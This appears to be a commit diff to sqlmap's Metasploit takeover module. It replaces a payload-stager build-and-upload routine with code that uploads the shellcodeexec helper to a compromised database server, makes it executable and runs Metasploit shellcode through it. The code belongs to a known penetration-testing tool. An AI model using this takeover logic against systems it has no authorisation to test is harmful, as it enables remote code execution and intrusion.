@@ -31,6 +31,7 @@ from lib.core.common import readInput
 from lib.core.data import conf
 from lib.core.data import kb
 from lib.core.data import logger
+from lib.core.data import paths
 from lib.core.enums import DBMS
 from lib.core.enums import OS
 from lib.core.exception import sqlmapDataException
@@ -41,7 +42,6 @@ from lib.core.subprocessng import blockingWriteToFD
 from lib.core.subprocessng import pollProcess
 from lib.core.subprocessng import setNonBlocking
 from lib.request.connect import Connect as Request
-from lib.takeover.upx import upx
 
 
 class Metasploit:
@@ -391,15 +391,15 @@ class Metasploit:
 
         self.udfExecCmd("'%s'" % self.shellcodeString, silent=True, udfName="sys_bineval")
 
-    def __runMsfPayloadRemote(self):
-        infoMsg  = "running Metasploit Framework 3 payload stager "
-        infoMsg += "remotely, please wait.."
+    def __runMsfShellcodeRemoteViaSexec(self):
+        infoMsg  = "running Metasploit Framework 3 shellcode remotely "
+        infoMsg += "via shellcodeexec, please wait.."
         logger.info(infoMsg)
 
         if not Backend.isOs(OS.WINDOWS):
-            self.execCmd("chmod +x %s" % self.exeFilePathRemote, silent=True)
+            self.execCmd("chmod +x %s" % self.shellcodeexecRemote, silent=True)
 
-        cmd = "%s &" % self.exeFilePathRemote
+        cmd = "%s %s &" % (self.shellcodeexecRemote, self.shellcodeString)
 
         self.execCmd(cmd, silent=True)
 
@@ -436,7 +436,6 @@ class Metasploit:
 
             proc.stdin.write("list_tokens -u\n")
             proc.stdin.write("getuid\n")
-
 
     def __controlMsfCmd(self, proc, func):
         stdin_fd = sys.stdin.fileno()
@@ -536,100 +535,31 @@ class Metasploit:
 
         os.unlink(self.__shellcodeFilePath)
 
-    def createMsfPayloadStager(self, initialize=True):
-        if initialize:
-            infoMsg = ""
-        else:
-            infoMsg = "re"
-
-        infoMsg += "creating Metasploit Framework 3 payload stager"
-
-        logger.info(infoMsg)
-
-        self.__randStr = randomStr(lowercase=True)
+    def uploadShellcodeexec(self, web=False):
+        self.shellcodeexecLocal = paths.SQLMAP_SEXEC_PATH
 
         if Backend.isOs(OS.WINDOWS):
-            self.exeFilePathLocal = os.path.join(conf.outputPath, "tmpm%s.exe" % self.__randStr)
-
-            # Metasploit developers added support for the old exe format
-            # to msfencode using '-t exe-small' (>= 3.3.3-dev),
-            # http://www.metasploit.com/redmine/projects/framework/repository/revisions/7840
-            # This is useful for sqlmap because on PostgreSQL it is not
-            # possible to write files bigger than 8192 bytes abusing the
-            # lo_export() feature implemented in sqlmap.
-            if Backend.getIdentifiedDbms() == DBMS.PGSQL:
-                self.__fileFormat = "exe-small"
-            else:
-                self.__fileFormat = "exe"
+            self.shellcodeexecLocal += "/windows/shellcodeexec/shellcodeexec.x%s.exe" % Backend.getArch()
         else:
-            self.exeFilePathLocal = os.path.join(conf.outputPath, "tmpm%s" % self.__randStr)
-            self.__fileFormat = "elf"
+            self.shellcodeexecLocal += "/linux/shellcodeexec.x%s" % Backend.getArch()
 
-        if initialize:
-            self.__initVars()
-
-        if self.payloadStr is None:
-            self.__prepareIngredients()
-
-        self.__forgeMsfPayloadCmd("process", self.__fileFormat, self.exeFilePathLocal)
-
-        logger.debug("executing local command: %s" % self.__payloadCmd)
-        process = execute(self.__payloadCmd, shell=True, stdout=None, stderr=PIPE)
-
-        dataToStdout("\r[%s] [INFO] creation in progress " % time.strftime("%X"))
-        pollProcess(process)
-        payloadStderr = process.communicate()[1]
-
-        if Backend.isOs(OS.WINDOWS):
-            payloadSize = re.search("size\s([\d]+)", payloadStderr, re.I)
-        else:
-            payloadSize = re.search("Length\:\s([\d]+)", payloadStderr, re.I)
-
-        os.chmod(self.exeFilePathLocal, stat.S_IRWXU)
-
-        if payloadSize:
-            payloadSize = payloadSize.group(1)
-            exeSize = os.path.getsize(self.exeFilePathLocal)
-
-            # Only pack the payload stager if the back-end DBMS operating
-            # system is Windows and new portable executable template is
-            # used
-            if self.__fileFormat == "exe":
-                packedSize = upx.pack(self.exeFilePathLocal)
-            else:
-                packedSize = None
-
-            debugMsg = "the encoded payload size is %s bytes, " % payloadSize
-
-            if packedSize and packedSize < exeSize:
-                debugMsg += "as a compressed portable executable its size "
-                debugMsg += "is %d bytes, decompressed it " % packedSize
-                debugMsg += "was %s bytes large" % exeSize
-            else:
-                debugMsg += "as a portable executable its size is "
-                debugMsg += "%s bytes" % exeSize
-
-            logger.debug(debugMsg)
-        else:
-            errMsg = "failed to create the payload stager (%s)" % payloadStderr
-            raise sqlmapFilePathException, errMsg
-
-    def uploadMsfPayloadStager(self, web=False):
-        if web:
-            self.exeFilePathRemote = "%s/%s" % (self.webDirectory, os.path.basename(self.exeFilePathLocal))
-        else:
-            self.exeFilePathRemote = "%s/%s" % (conf.tmpPath, os.path.basename(self.exeFilePathLocal))
-
-        self.exeFilePathRemote = ntToPosixSlashes(normalizePath(self.exeFilePathRemote))
-
-        logger.info("uploading payload stager to '%s'" % self.exeFilePathRemote)
+        # TODO: until web.py's __webFileStreamUpload() method does not consider the destFileName
+        #__basename = "tmpse%s%s" % (self.__randStr, ".exe" if Backend.isOs(OS.WINDOWS) else "")
+        __basename = os.path.basename(self.shellcodeexecLocal)
 
         if web:
-            self.webFileUpload(self.exeFilePathLocal, self.exeFilePathRemote, self.webDirectory)
+            self.shellcodeexecRemote = "%s/%s" % (self.webDirectory, __basename)
         else:
-            self.writeFile(self.exeFilePathLocal, self.exeFilePathRemote, "binary", False)
+            self.shellcodeexecRemote = "%s/%s" % (conf.tmpPath, __basename)
 
-        os.unlink(self.exeFilePathLocal)
+        self.shellcodeexecRemote = ntToPosixSlashes(normalizePath(self.shellcodeexecRemote))
+
+        logger.info("uploading shellcodeexec to '%s'" % self.shellcodeexecRemote)
+
+        if web:
+            self.webFileUpload(self.shellcodeexecLocal, self.shellcodeexecRemote, self.webDirectory)
+        else:
+            self.writeFile(self.shellcodeexecLocal, self.shellcodeexecRemote, "binary", False)
 
     def pwn(self, goUdf=False):
         if goUdf:
@@ -637,7 +567,7 @@ class Metasploit:
             func = self.__runMsfShellcodeRemote
         else:
             exitfunc = "process"
-            func = self.__runMsfPayloadRemote
+            func = self.__runMsfShellcodeRemoteViaSexec
 
         self.__runMsfCli(exitfunc=exitfunc)
 
@@ -650,7 +580,7 @@ class Metasploit:
 
         if not goUdf:
             time.sleep(1)
-            self.delRemoteFile(self.exeFilePathRemote)
+            self.delRemoteFile(self.shellcodeexecRemote)
 
     def smb(self):
         self.__initVars()
